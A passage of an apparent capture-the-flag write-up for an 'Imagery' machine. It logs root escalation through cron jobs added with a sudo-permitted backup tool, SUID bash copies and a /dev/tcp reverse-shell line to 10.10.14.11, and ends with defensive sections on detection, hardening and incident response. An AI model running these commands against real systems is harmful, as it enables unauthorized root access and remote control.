```

Lets see about the cleaning archive file ,

There is no such option for archive cleanup . Lets add password now this time and see and remove the timestamp arg too
```bash
auto add --schedule "* * * * *" --command "charcol backup -i /root/ -o /tmp/r3b00t/backup -p haha" --name "rootDump" --log-output /tmp/r3b00t/backup.log
```

Lets see what happens this time.
Okay there is a backup file now . So we should add password . Huhh
Lets dump it locally and extract .
Nope it shows empty . Lets extract it from the charcol application itself.
Nope that shows empty

Lets edit the cron job
```bash
auto add --schedule "* * * * *" --command "charcol backup -i /root -o /tmp/r3b00t/backup -p haha" --name "rootDump" --log-output /tmp/r3b00t/backup.log
```
  
Nope that didnt work  .Lets add suid C program , backup and then extract or copy /bin/bash and backup and then decrypt it and see
```bash
auto add --schedule "* * * * *" --command "charcol backup -i /bin/bash -o /tmp/r3b00t/backup -p haha --no-timestamp" --name "binBashBkp"  --log-output /tmp/r3b00t/backup.log
```
  
Now working . Lets try not to add -o and
```bash
auto add --schedule "* * * * *" --command "charcol backup -i /bin/bash -p haha --no-timestamp" --name "binBashBkp"  --log-output /tmp/r3b00t/backup.log
```

  
That didnt work . Maybe we need to copy binBash file and backup that one I guess
```bash
auto add --schedule "* * * * *" --command "charcol backup -i /tmp/r3b00t/bash -o /tmp/r3b00t/rshell -p haha --no-timestamp" --name "binBashBkp"  --log-output /tmp/r3b00t/backup.log
```
  
Added this one , lets see what happens .
Yeah now I can see bash file when listing . Lets extract it

```bash
auto edit 8a47f12b-48da-4828-a0ac-3b81e2468bb4 --schedule "* * * * *" --command "charcol backup -i /tmp/r3b00t/bash -o /tmp/r3b00t/rshell2 -p haha --no-timestamp" --name "binBashBkp2"  --log-output /tmp/r3b00t/backup.log
```
  
Lets see what can we do
Lets see if we can add regular bash commands
```bash
auto add --schedule "* * * * *" --command "cp /bin/bash /tmp/r3b00t/rootShell3; chmod u+s /tmp/r3b00t/rootShell3" --name "binBashBkp3"  --log-output /tmp/r3b00t/backup.log
```
  
  
Lets see what happened . Shit I am stupid . We can run normal bash commands , i thought the --command in auto add was exclusive to the application commands only . Looks like we can add system commands too here

It worked , but not able to get rootshell
- rwsr-xr-x  1 root root 1.5M Oct  3 10:32 rootShell3

```bash
auto edit 5fe76728-a07a-4159-9478-76401da09521 --schedule "* * * * *" --command "/tmp/r3b00t/rshellC" --name "binBashBkp4"  --log-output /tmp/r3b00t/backup4.log
```
  
Okay compiled C code and added it to run as cron job. Lets see what happens
Maybe we need to copy the file from /usr/bin

Lets start another nc listeneer
`sh -i >& /dev/tcp/10.10.14.11/8188 0>&1`
  
```bash
auto add --schedule "* * * * *" --command "/tmp/varRootShell" --name "varRootShell"  --log-output /tmp/r1.log
```
  
I've figured out why the rootshell was not working . It is because there maybe nosuid=1 on /tmp which doesnt allow executing suid bits on /tmp

This confirms why the suid was not working on /tmp folder
```bash
root@Imagery:/root# mount | grep "/tmp"
tmpfs on /tmp type tmpfs (rw,nosuid,nodev,size=1979616k,nr_inodes=1048576,inode64)
```
    

# What Actually Happened
- The attacker started with **reconnaissance** — using tools like `nmap` and `ffuf` to find **which ports** and **web endpoints** were open.  Think of this as shaking the building doors to see which one’s unlocked.
    
- They found a **Flask‑based web app** where users could report bugs and upload images. Hidden in that code was a small input sanitization issue that allowed the attacker to run **XSS (cross‑site scripting)**, which made the admin’s browser send back its **authentication cookie**.
    
- Once they had the admin cookie, they were inside the management zone of the app.  From there, they found a **server‑side weakness** in one API endpoint (`applyvisualtransform`) that used `subprocess.run(..., shell=True)`.  
  
- This allowed them to inject a **reverse shell** . Basically making the server open a secret connection back to the attacker’s machine.
    
- After entering as the `web` user, they found a binary (`charcol`) that was allowed to run as **root** without a password (`sudo NOPASSWD`).  
  
- By creating a fake cron job through this tool, they escalated privilege to **root**, gaining full system control.

# SOC Detection In Simple Technical Terms

| Attack Step                | What It Looks Like to a SOC                                                                                                             |
| -------------------------- | --------------------------------------------------------------------------------------------------------------------------------------- |
| **Recon** (`nmap`, `ffuf`) | Unusual spikes in port scans, 405/401 HTTP codes, repetitive requests from one IP                                                       |
| **XSS Attack**             | Outbound traffic to attacker IPs carrying cookies or encoded strings (`document.cookie`)                                                |
| **Command Injection**      | Web server (`python` or `gunicorn`) spawning unexpected child processes (bash, nc)                                                      |
| **Reverse Shell**          | Network connection from internal host to an unknown external IP                                                                         |
| **Privilege Escalation**   | Execution of `/usr/local/bin/charcol` or other binaries via sudo without prior authentication and creation of cron jobs in user context |
| **Persistence**            | Repeated execution of custom cron or backup processes with altered arguments                                                            |

# How To Prevent It

1. **Web Layer Hardening**
    
    - Disable `shell=True` in Python’s `subprocess` calls.
    - Sanitize all user input in the web app (especially `title`, `description`).
    - Use **HttpOnly** and **SameSite** cookie flags to stop XSS cookie theft.
        
2. **System Layer Defense**
    
    - Remove unnecessary `NOPASSWD` sudo privileges.
    - Mount `/tmp` as `noexec,nosuid,nodev` .
    - Limit cron job creation to admin‑approved scripts only.
        
3. **Monitoring & Alerts**
    
    - Create rules in Suricata/SIEM for patterns like:
        
        - High volume of web requests with many 405 responses.
        - Python processes spawning bash or netcat.
        - File creation events with SUID bit set on non‑standard locations.
            
4. **Credential & Config Protection**
    
    - Keep `SECRET_KEY` and backup passwords outside the app repo (in environment variables or vaults).
    - Regularly rotate keys and disable default dev tokens like `default-secret-token-for-dev`.


# Incident Response (IR) Flow . Easy Technical Summary

1. **Preparation:**  
    Logs, alerts, and playbooks must already exist. Collect system logs (`/var/log/auth.log`, `auditd`, and web access logs`).
    
2. **Detection:**  
    Receive alerts from WAF or EDR . Example , “python spawning bash” or outbound `nc` session.
    
3. **Containment:**  
    Block attacker IP, revoke admin cookies, remove `/tmp` reverse shell binaries.
    
4. **Eradication:**  
    Patch Flask code, fix subprocess misuses, remove `NOPASSWD` rules.
    
5. **Recovery:**  
    Restore healthy web instances from a clean backup, re‑deploy under container isolation with `AppArmor`/`SELinux`.
    
6. **Lessons Learned:**
    - Always assume attackers will chain small flaws (XSS → cookie reuse → command inject → sudo abuse).
    - Monitor cross‑layer events. Web and system telemetry together tell the real story.